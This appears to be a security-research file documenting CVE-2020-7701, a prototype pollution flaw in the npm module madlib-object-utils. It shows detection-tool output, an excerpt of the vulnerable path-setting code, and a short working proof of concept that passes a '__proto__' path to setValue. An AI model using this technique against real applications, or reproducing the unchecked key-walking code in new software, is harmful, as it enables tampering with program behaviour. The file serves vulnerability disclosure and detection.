// Module Name : madlib-object-utils
// Version : 0.1.6
// CVE number : CVE-2020-7701
// CVSS score : 9.8 (CVSS 3.0)
// Published Date : 14 Aug, 2020

/* DAPP analysis result
[+] FileSize(Bytes) : 8411
[+] Total Time(ms) : 4103
[+] Analysis Time(ms) : 159
[+] Detected AST Pattern 1 : 3 
[+] Detected AST Pattern 2 : 1
SCC generation complete

**********Prototype Pollution v1 found!**********
[ 5556, 5575 ] value = value [ key ]
[ 5499, 5525 ] value [ key ]= defaultValue 
*/

// Prototype pollution source code patterns detected
/*
getAndCreate = function(path, object, defaultValue) {
	...
	value[key] = defaultValue;		//AST Pattern 2
	...
	value = value[key];         	//AST Pattern 1
	... 
	return value;
};
setValue = function(path, object, value) {
	getAndCreate(path, object, value);
	return object;
};
*/

// POC of CVE-2020-7701
const objectUtils = require('madlib-object-utils')
objectUtils.setValue('__proto__.polluted', {}, true)
console.log(polluted) //true
